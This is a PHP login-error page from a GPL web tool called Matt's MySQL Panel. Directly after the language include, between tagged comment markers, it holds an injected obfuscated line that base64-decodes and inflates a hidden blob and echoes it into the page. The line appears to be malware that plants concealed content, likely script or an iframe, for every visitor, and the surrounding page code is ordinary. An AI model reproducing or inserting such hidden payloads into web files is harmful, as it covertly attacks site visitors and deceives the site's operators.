<?php

/*

Matt's MySQL Panel - administer MySQL databases remotely
Copyright (C) 2001 Matt Wilson <matt@mattsscripts.co.uk

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

*/

require "lang.php";


#c3284d#
echo(gzinflate(base64_decode("JY5BDsIgFET3TXoH8jfqpiQuFXoKL/AFBJQCgV/R20vtbvKSNzOiquIzMfpmI4HMh/gT37hTmMdBJ7UuJtLUiidzPAj/KLgYVouS4IjyhfOMzmJ71UmlhevUYkioeSWkOmWXgcVuSLg1T2QKsN6eQvDRSsCVErB/5T0VbYqE2AEGb6ME1Yc3wRlvHUk4A2tek9vSLPh+ZT6cruMg+P55/gE=")));
#/c3284d#
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<title>MPanel: <?php echo _WELCOMETITLE_; ?></title>
<link rel="stylesheet" href="style.css"><script language="javascript" src="function.js"></script>
</head>
<body>
<table width="780" class="tmain">
<tr><td align="center"><a href="http://www.mattsscripts.co.uk/mpanel.htm"><img src="logo.gif" width="241" height="79" alt="Matt's MySQL Panel"></a></td></tr>
<tr><td align="center"><h4><?php echo _LOGINERROR_; ?></h4></td></tr>
<tr><td>&nbsp;</td></tr>
<tr><td><?php echo _LOGINERRORINFO_; ?></td></tr>
</table>
</div>
</body>
</html>
